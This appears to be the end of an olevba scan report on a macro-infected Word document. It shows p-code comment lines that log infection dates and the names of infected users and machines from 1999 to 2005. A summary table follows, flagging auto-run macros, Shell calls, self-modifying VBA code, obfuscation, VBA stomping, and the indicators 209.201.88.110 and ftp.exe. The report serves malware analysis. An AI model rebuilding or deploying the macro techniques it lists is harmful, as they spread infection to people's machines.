' Line #285:
' 	QuoteRem 0x0000 0x0000 ""
' Line #286:
' Line #287:
' Line #288:
' Line #289:
' 	QuoteRem 0x0000 0x0020 " 10:42:41  - пятница, 9 июл 1999"
' Line #290:
' 	QuoteRem 0x0000 0x000D " запад-восток"
' Line #291:
' 	QuoteRem 0x0000 0x0000 ""
' Line #292:
' Line #293:
' Line #294:
' Line #295:
' 	QuoteRem 0x0000 0x0021 " 06:41:28  - четверг, 23 сен 1999"
' Line #296:
' 	QuoteRem 0x0000 0x000B " Olga Brook"
' Line #297:
' 	QuoteRem 0x0000 0x0000 ""
' Line #298:
' Line #299:
' Line #300:
' Line #301:
' 	QuoteRem 0x0000 0x0024 " 08:05:18 AM - Saturday, 27 Nov 1999"
' Line #302:
' 	QuoteRem 0x0000 0x0003 " xx"
' Line #303:
' 	QuoteRem 0x0000 0x0000 ""
' Line #304:
' Line #305:
' Line #306:
' Line #307:
' 	QuoteRem 0x0000 0x0025 " 02:08:34  - понедельник, 27 дек 1999"
' Line #308:
' 	QuoteRem 0x0000 0x0007 " Albert"
' Line #309:
' 	QuoteRem 0x0000 0x0000 ""
' Line #310:
' Line #311:
' Line #312:
' Line #313:
' 	QuoteRem 0x0000 0x0025 " 06:44:04  - понедельник, 10 янв 2000"
' Line #314:
' 	QuoteRem 0x0000 0x0007 " Albert"
' Line #315:
' 	QuoteRem 0x0000 0x0000 ""
' Line #316:
' Line #317:
' Line #318:
' Line #319:
' 	QuoteRem 0x0000 0x0021 " 01:58:15  - вторник, 18 янв 2000"
' Line #320:
' 	QuoteRem 0x0000 0x0004 " tai"
' Line #321:
' 	QuoteRem 0x0000 0x0000 ""
' Line #322:
' Line #323:
' Line #324:
' Line #325:
' 	QuoteRem 0x0000 0x0021 " 04:16:14  - четверг, 27 янв 2000"
' Line #326:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #327:
' 	QuoteRem 0x0000 0x0000 ""
' Line #328:
' Line #329:
' Line #330:
' Line #331:
' 	QuoteRem 0x0000 0x0022 " 02:43:04 PM - суббота, 3 фев 2001"
' Line #332:
' 	QuoteRem 0x0000 0x001B " CONSUCCO BUSINESS SERVICES"
' Line #333:
' 	QuoteRem 0x0000 0x0000 ""
' Line #334:
' Line #335:
' Line #336:
' Line #337:
' 	QuoteRem 0x0000 0x0022 " 06:34:23 PM - вторник, 8 фев 2000"
' Line #338:
' 	QuoteRem 0x0000 0x001B " Consulco Business Services"
' Line #339:
' 	QuoteRem 0x0000 0x0000 ""
' Line #340:
' Line #341:
' Line #342:
' Line #343:
' 	QuoteRem 0x0000 0x0021 " 10:43:02  - четверг, 10 фев 2000"
' Line #344:
' 	QuoteRem 0x0000 0x0005 " Aram"
' Line #345:
' 	QuoteRem 0x0000 0x0000 ""
' Line #346:
' Line #347:
' Line #348:
' Line #349:
' 	QuoteRem 0x0000 0x0021 " 12:18:21  - пятница, 10 мар 2000"
' Line #350:
' 	QuoteRem 0x0000 0x0008 " Tatyana"
' Line #351:
' 	QuoteRem 0x0000 0x0000 ""
' Line #352:
' Line #353:
' Line #354:
' Line #355:
' 	QuoteRem 0x0000 0x0021 " 01:22:21  - суббота, 18 мар 2000"
' Line #356:
' 	QuoteRem 0x0000 0x000F " Dmitry Kuryata"
' Line #357:
' 	QuoteRem 0x0000 0x0000 ""
' Line #358:
' Line #359:
' Line #360:
' Line #361:
' 	QuoteRem 0x0000 0x0025 " 01:00:14  - понедельник, 20 Мар 2000"
' Line #362:
' 	QuoteRem 0x0000 0x0007 " Serega"
' Line #363:
' 	QuoteRem 0x0000 0x0000 ""
' Line #364:
' Line #365:
' Line #366:
' Line #367:
' 	QuoteRem 0x0000 0x0025 " 04:35:35  - понедельник, 27 Мар 2000"
' Line #368:
' 	QuoteRem 0x0000 0x0007 " Serega"
' Line #369:
' 	QuoteRem 0x0000 0x0000 ""
' Line #370:
' Line #371:
' Line #372:
' Line #373:
' 	QuoteRem 0x0000 0x0025 " 03:17:17  - понедельник, 10 апр 2000"
' Line #374:
' 	QuoteRem 0x0000 0x0007 " A109_1"
' Line #375:
' 	QuoteRem 0x0000 0x0000 ""
' Line #376:
' Line #377:
' Line #378:
' Line #379:
' 	QuoteRem 0x0000 0x0024 " 08:08:36  - понедельник, 1 фев 1999"
' Line #380:
' 	QuoteRem 0x0000 0x0006 " guest"
' Line #381:
' 	QuoteRem 0x0000 0x0000 ""
' Line #382:
' Line #383:
' Line #384:
' Line #385:
' 	QuoteRem 0x0000 0x0021 " 09:38:26  - пятница, 12 май 2000"
' Line #386:
' 	QuoteRem 0x0000 0x0006 " guest"
' Line #387:
' 	QuoteRem 0x0000 0x0000 ""
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' 	QuoteRem 0x0000 0x0021 " 02:11:25  - вторник, 23 май 2000"
' Line #392:
' 	QuoteRem 0x0000 0x0006 " GUEST"
' Line #393:
' 	QuoteRem 0x0000 0x0000 ""
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' 	QuoteRem 0x0000 0x0020 " 06:49:28  - четверг, 2 ноя 2000"
' Line #398:
' 	QuoteRem 0x0000 0x0006 " GUEST"
' Line #399:
' 	QuoteRem 0x0000 0x0000 ""
' Line #400:
' Line #401:
' Line #402:
' Line #403:
' 	QuoteRem 0x0000 0x0020 " 05:50:33  - пятница, 3 ноя 2000"
' Line #404:
' 	QuoteRem 0x0000 0x000A " d113_main"
' Line #405:
' 	QuoteRem 0x0000 0x0000 ""
' Line #406:
' Line #407:
' Line #408:
' Line #409:
' 	QuoteRem 0x0000 0x0020 " 10:08:54  - четверг, 9 ноя 2000"
' Line #410:
' 	QuoteRem 0x0000 0x000E " Voida Ludmila"
' Line #411:
' 	QuoteRem 0x0000 0x0000 ""
' Line #412:
' Line #413:
' Line #414:
' Line #415:
' 	QuoteRem 0x0000 0x0020 " 06:21:52  - вторник, 5 дек 2000"
' Line #416:
' 	QuoteRem 0x0000 0x0007 " A109_1"
' Line #417:
' 	QuoteRem 0x0000 0x0000 ""
' Line #418:
' Line #419:
' Line #420:
' Line #421:
' 	FuncDefn (Private Sub Document_New())
' Line #422:
' Line #423:
' 	EndSub 
' Line #424:
' Line #425:
' 	FuncDefn (Private Sub Document_Open())
' Line #426:
' Line #427:
' 	EndSub 
' Line #428:
' 	QuoteRem 0x0000 0x0020 " 08:03:23  - суббота, 9 дек 2000"
' Line #429:
' 	QuoteRem 0x0000 0x0012 " Ashihmin Alexandr"
' Line #430:
' 	QuoteRem 0x0000 0x0000 ""
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' 	QuoteRem 0x0000 0x0021 " 02:04:26  - четверг, 21 дек 2000"
' Line #435:
' 	QuoteRem 0x0000 0x0004 " uuu"
' Line #436:
' 	QuoteRem 0x0000 0x0000 ""
' Line #437:
' Line #438:
' Line #439:
' Line #440:
' 	QuoteRem 0x0000 0x0020 " 07:54:42  - субота, 30 Грг 2000"
' Line #441:
' 	QuoteRem 0x0000 0x0007 " A224_1"
' Line #442:
' 	QuoteRem 0x0000 0x0000 ""
' Line #443:
' Line #444:
' Line #445:
' Line #446:
' 	QuoteRem 0x0000 0x0020 " 10:53:43  - суббота, 6 янв 2001"
' Line #447:
' 	QuoteRem 0x0000 0x0005 " User"
' Line #448:
' 	QuoteRem 0x0000 0x0000 ""
' Line #449:
' Line #450:
' Line #451:
' Line #452:
' 	QuoteRem 0x0000 0x0025 " 06:33:00  - понедельник, 15 янв 2001"
' Line #453:
' 	QuoteRem 0x0000 0x0004 " mAn"
' Line #454:
' 	QuoteRem 0x0000 0x0000 ""
' Line #455:
' Line #456:
' Line #457:
' Line #458:
' 	QuoteRem 0x0000 0x0020 " 09:55:19  - серада, 24 Сту 2001"
' Line #459:
' 	QuoteRem 0x0000 0x0006 " Eugen"
' Line #460:
' 	QuoteRem 0x0000 0x0000 ""
' Line #461:
' Line #462:
' Line #463:
' Line #464:
' 	QuoteRem 0x0000 0x0021 " 09:59:44  - пятница, 16 фев 2001"
' Line #465:
' 	QuoteRem 0x0000 0x0007 " Office"
' Line #466:
' 	QuoteRem 0x0000 0x0000 ""
' Line #467:
' Line #468:
' Line #469:
' Line #470:
' 	QuoteRem 0x0000 0x0024 " 03:44:14  - понедельник, 5 мар 2001"
' Line #471:
' 	QuoteRem 0x0000 0x000A " Secretary"
' Line #472:
' 	QuoteRem 0x0000 0x0000 ""
' Line #473:
' Line #474:
' Line #475:
' Line #476:
' 	QuoteRem 0x0000 0x0025 " 05:13:40  - понедельник, 24 янв 2005"
' Line #477:
' 	QuoteRem 0x0000 0x000D " xLock - лох!"
' Line #478:
' 	QuoteRem 0x0000 0x0000 ""
' Line #479:
' Line #480:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

